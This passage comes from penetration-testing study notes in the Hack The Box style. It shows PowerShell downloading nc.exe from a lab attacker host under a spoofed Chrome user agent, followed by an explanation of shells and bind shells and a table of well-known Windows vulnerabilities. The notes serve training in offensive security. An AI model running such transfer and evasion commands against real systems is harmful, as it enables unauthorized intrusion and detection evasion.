&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Microsoft.PowerShell.Commands.PSUserAgent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,@{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Microsoft.PowerShell.Commands.PSUserAgent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;InternetExplorer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Agent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Mozilla/5.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compatible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MSIE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;9.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;en-US&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FireFox&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Agent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Mozilla/5.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;en-US&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Gecko/20100401&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Firefox/4.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Chrome&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Agent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Mozilla/5.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;en-US&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AppleWebKit/534.6&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;like&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Gecko&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Chrome/7.0.500.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
             &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Safari/534.6&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Opera&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Agent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Opera/9.70&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;en-US&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Presto/2.2.1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Safari&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Agent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Mozilla/5.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;en-US&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AppleWebKit/533.16&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;like&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Gecko&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Version/5.0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
             &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Safari/533.16&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$UserAgent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Microsoft.PowerShell.Commands.PSUserAgent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Chrome&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.10.32/nc.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UserAgent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$UserAgent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Public\nc.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;as you can see .. User is different now:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 80

listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.32] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows NT&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Windows NT 10.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; en-US&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AppleWebKit/534.6
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KHTML, Like Gecko&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example). As penetration testers and information security professionals, a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host.&lt;/p&gt;

&lt;h2 id=&quot;why-get-a-shell&quot;&gt;Why Get a Shell?&lt;/h2&gt;

&lt;p&gt;Remember that the shell gives us direct access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OS&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system commands&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file system&lt;/code&gt;. So if we gain access, we can start enumerating the system for vectors that may allow us to escalate privileges, pivot, transfer files, and more. If we don’t establish a shell session, we are pretty limited on how far we can get on a target machine.&lt;/p&gt;

&lt;p&gt;Every operating system has a shell, and to interact with it, we must use an application known as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terminal emulator&lt;/code&gt;. Here are some of the most common terminal emulators:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;&lt;strong&gt;Terminal Emulator&lt;/strong&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;&lt;strong&gt;Operating System&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://github.com/microsoft/terminal&quot;&gt;Windows Terminal&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://cmder.app&quot;&gt;cmder&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://www.putty.org&quot;&gt;PuTTY&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://sw.kovidgoyal.net/kitty/&quot;&gt;kitty&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows, Linux and MacOS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://github.com/alacritty/alacritty&quot;&gt;Alacritty&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows, Linux and MacOS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://invisible-island.net/xterm/&quot;&gt;xterm&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/GNOME_Terminal&quot;&gt;GNOME Terminal&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://github.com/mate-desktop/mate-terminal&quot;&gt;MATE Terminal&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://konsole.kde.org&quot;&gt;Konsole&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Terminal_\(macOS\)&quot;&gt;Terminal&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MacOS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://iterm2.com&quot;&gt;iTerm2&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MacOS&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Much like a human language interpreter will translate spoken or sign language in real-time, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command language interpreter&lt;/code&gt; is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing. So when we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter.&lt;/p&gt;

&lt;p&gt;Many different command language interpreters can be used, some of which are also called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell scripting languages&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Command and Scripting interpreters&lt;/code&gt; as defined in the &lt;a href=&quot;https://attack.mitre.org/techniques/T1059/&quot;&gt;Execution techniques&lt;/a&gt; of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MITRE ATT&amp;amp;CK Matrix&lt;/code&gt;. We do not need to be software developers to understand these concepts, but the more we know, the more success we can have when attempting to exploit vulnerable systems to gain a shell session.&lt;/p&gt;

&lt;h4 id=&quot;bind-example&quot;&gt;Bind Example&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/115/bindshell.png&quot; alt=&quot;Bind shell setup: Pentester&apos;s system 10.10.14.15 connects to target 10.10.14.20:1337 using netcat command.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As seen in the image, we would connect directly with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP address&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port&lt;/code&gt; listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;There would have to be a listener already started on the target.&lt;/li&gt;
  &lt;li&gt;If there is no listener started, we would need to find a way to make this happen.&lt;/li&gt;
  &lt;li&gt;Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.&lt;/li&gt;
  &lt;li&gt;Operating system firewalls (on Windows &amp;amp; Linux) will likely block most incoming connections that aren’t associated with trusted network-based applications.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;infiltrating-windows&quot;&gt;Infiltrating Windows&lt;/h1&gt;

&lt;p&gt;Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.&lt;/p&gt;

&lt;p&gt;For example, just in the last five years, there have been &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3688&lt;/code&gt; reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from &lt;a href=&quot;https://www.cvedetails.com/vendor/26/Microsoft.html&quot;&gt;HERE&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;prominent-windows-exploits&quot;&gt;Prominent Windows Exploits&lt;/h2&gt;

&lt;p&gt;Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let’s discuss those for a minute:&lt;/p&gt;

&lt;p&gt;| &lt;strong&gt;Vulnerability&lt;/strong&gt; | &lt;strong&gt;Description&lt;/strong&gt;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| —————– | —————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————- |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS08-067&lt;/code&gt;        | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.                                                                                                                                                                                      |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Eternal Blue&lt;/code&gt;    | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.                                                                                                |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PrintNightmare&lt;/code&gt;  | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it &lt;a href=&quot;https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html&quot;&gt;here&lt;/a&gt;.                                                                                          |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BlueKeep&lt;/code&gt;        | CVE 2019-0708 is a vulnerability in Microsoft’s RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.                                                                                                                                                                                                                                                     |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sigred&lt;/code&gt;          | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain’s DNS server which is commonly the primary Domain Controller.                                                                                                                                                                                                   |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeriousSam&lt;/code&gt;      | CVE 2021-36934 exploits an issue with the way Windows handles permission on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\system32\config&lt;/code&gt; folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can’t be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
